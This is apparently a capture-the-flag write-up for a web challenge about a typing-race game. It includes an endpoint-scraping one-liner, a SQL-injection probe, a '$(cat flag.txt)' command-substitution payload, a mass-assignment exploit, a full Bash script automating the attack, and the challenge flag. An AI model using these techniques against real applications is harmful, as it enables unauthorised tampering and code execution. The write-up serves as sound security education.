<img width="585" height="617" alt="Screenshot 2026-03-08 151327" src="https://github.com/user-attachments/assets/c12793c4-5b54-4a74-b053-1177c226b9a4" />

**Category:** Web Exploitation 
**Objective:** Bypass the typing speed mechanics of an online racing game to beat three impossibly fast bots (Marc, Pecco, Fabio) and capture the flag.

### Challenge Overview

The challenge presented a web application simulating a typing race. The frontend UI clearly showed three bot competitors typing at superhuman speeds. The instructions explicitly hinted at the objective: _"If you want the flag, you'll have to find a way to make them slow down."_

### Initial Reconnaissance & The Rabbit Holes

The initial assessment of the application revealed an API endpoint used to fetch user statistics: `http://chals1.apoorvctf.xyz:4001/api/v1/stats?id=1`. Concurrently, an inspection of the HTML source code uncovered a developer comment leaking a sensitive file path: ``

This led to the first major rabbit hole.

- **Failed LFI & SQLi Attempts:** Assuming the goal was to read or overwrite `/tmp/bot_multiplier.conf`, initial attacks targeted the `stats?id=` parameter. Path traversal (`../../`) failed.
    
- **Database Constraints:** Injecting a single quote (`'`) triggered a verbose SQLite error. While this confirmed SQL Injection, SQLite's lack of native file I/O capabilities (like MySQL's `INTO OUTFILE` or `LOAD_FILE()`) meant directly overwriting the configuration file via the database driver was a dead end.
    

### Source Code Analysis & Pivoting

Abandoning the SQLi vector, my methodology shifted to analyzing the application's client-side routing. The application was built with Next.js. By scraping the main page and extracting the JavaScript chunks, a simple `grep` command revealed hidden API endpoints:

Bash

```shell

curl -s http://chals1.apoorvctf.xyz:4001 | grep -oP '(?<=src=")/_next/static/chunks/[^"]+\.js' | while read -r url; do
    curl -s "http://chals1.apoorvctf.xyz:4001$url" | grep -ioE '(api/[a-zA-Z0-9_/-]+)'
done
```

This extraction uncovered two critical endpoints governing the game loop:

- `/api/v1/race/start`
    
- `/api/v1/race/sync`
    

### Analyzing the Game Engine

Sending a POST request to `/race/start` returned a comprehensive JSON object containing the game state:

- A `race_id`.
    
- A JWT token for authorization.
    
- A `bot_multiplier` set to `1.25`.
    
- The `text` array containing the words to type.
    

A subsequent POST request to `/race/sync` required the `race_id`, the JWT in the Authorization header, and a JSON body to update user progress.

### Exploitation: Mass Assignment

To fulfill the challenge prompt ("make them slow down"), a **Mass Assignment** vulnerability was tested against the `/sync` endpoint. By manually injecting `"bot_multiplier": 0` into the JSON payload, the server blindly accepted the parameter and overwrote the active configuration for that specific race. The bots' typing speeds instantly plummeted to ~9 WPM.

### The Second Rabbit Hole: Command Injection Bait

While inspecting the `/sync` HTTP responses, a suspicious header appeared: `x-trace: pipe/word-logger`. This strongly implied the backend was passing the typed words directly into an OS shell pipe. Extensive testing was done to achieve Remote Code Execution (RCE) via command substitution (e.g., `word: "$(cat flag.txt)"`) within the sync payload. This proved to be an intentional distraction planted by the challenge author.

### The Kill Chain: API Automation

With the bots successfully frozen via Mass Assignment, the final step was to complete the race. The Next.js JavaScript chunks were analyzed one final time to extract the exact expected JSON schema for the `/sync` endpoint, revealing the required `word` parameter.

Running this entirely from a Kali WSL terminal, a custom Bash script was authored to automate the victory. The script initiated a race, parsed the target text array, and looped through every word, firing authenticated `/sync` requests at machine speed while persistently keeping the bots frozen with `bot_multiplier: 0`.

Bash

```bash

# 1. Start the race and extract variables via jq
DATA=$(curl -s -X POST "http://chals1.apoorvctf.xyz:4001/api/v1/race/start" -H "Content-Type: application/json" -d '{}')
ID=$(echo "$DATA" | jq -r .race_id)
TOK=$(echo "$DATA" | jq -r .token)
TXT=$(echo "$DATA" | jq -r .text)

# 2. Convert text into a Bash array
WORDS=($TXT)
TOTAL=${#WORDS[@]}

# 3. Loop through and submit every word instantly
for i in "${!WORDS[@]}"; do
    WORD="${WORDS[$i]}"
    PROG=$(( (i + 1) * 100 / TOTAL ))
    
    RESPONSE=$(curl -s -X POST "http://chals1.apoorvctf.xyz:4001/api/v1/race/sync" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOK" \
    -d "$(jq -n --arg id "$ID" --arg w "$WORD" --argjson p "$PROG" '{race_id: $id, bot_multiplier: 0, wpm: 250, progress: $p, word: $w}')")
done

echo "$RESPONSE" | jq .
```

### The Flag

The server registered a 100% completion rate before the bots could finish a single sentence, returning the victory payload and the flag. The flag itself acknowledged the intentional rabbit hole:

`apoorvctf{typ1ng_f4st3r_th4n_sh3ll_1nj3ct10n}`

